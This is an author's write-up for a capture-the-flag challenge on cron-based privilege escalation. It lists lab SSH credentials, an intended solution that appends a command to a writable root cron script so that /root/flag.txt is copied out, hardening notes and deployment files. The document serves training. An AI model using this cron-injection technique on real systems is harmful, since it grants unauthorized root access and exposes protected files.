# cron-append writeup (for author)

## Purpose
Train cron-based privilege escalation by modifying a root-owned cron script that is writable by the player.

## Access
- SSH: user `ctf`, pass `ctf123`
- CTFd shows `ssh ctf@ip -p port`

## Intended path
1) Inspect cron jobs:
```
cat /etc/crontab
```
2) Identify root job:
```
* * * * * root /opt/ctf/cron/backup.sh
```
3) Modify writable script to drop flag into a readable location:
```
echo 'cat /root/flag.txt > /home/ctf/flag.txt' >> /opt/ctf/cron/backup.sh
```
4) Wait ~1 minute and read:
```
cat /home/ctf/flag.txt
```

## Flag location
- Real flag is stored in `/root/flag.txt` (root-only).

## Hardening notes
- `sudo` removed.
- `su` locked down.
- All other SUID bits stripped.
- Only intended path is cron.

## Files (prod)
- `ctfd/Dockerfile`
- `ctfd/entrypoint.sh`
- `ctfd/docker-compose.yml`

## Files (test)
- `test/Dockerfile`
- `test/entrypoint.sh`
- `test/docker-compose.yml`

## What to change before prod
- Replace `FLAG` value in CTFd config (platform will inject).
- Update `CTF_USER`/`CTF_PASS` if needed.
- Optional: update MOTD/WELCOME hints in `entrypoint.sh`.
